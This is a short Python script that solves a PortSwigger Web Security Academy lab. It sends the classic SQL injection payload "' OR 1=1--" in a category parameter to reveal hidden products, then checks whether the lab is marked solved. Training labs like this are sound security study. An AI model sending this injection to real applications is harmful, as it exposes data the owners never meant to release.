# https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
# Difficulty: Apprentice

import requests
from pwn import log

sub = '0a26004403feeaf6830002220083004c'
url = f'https://{sub}.web-security-academy.net/'

def exploit():
    payload = "' OR 1=1--"
    s = requests.session()
    r = s.get(url, params={"category": payload})
    
    log.info(f"Status code: {r.status_code}")
    log.info(f"Payload sent: {url}category={payload}")
    
    r = s.get(url)
    if 'Congratulations, you solved the lab!' in r.text:
        log.success('Lab solved')
    else:
        log.failure('Lab not solved yet')

if __name__ == '__main__':
    exploit()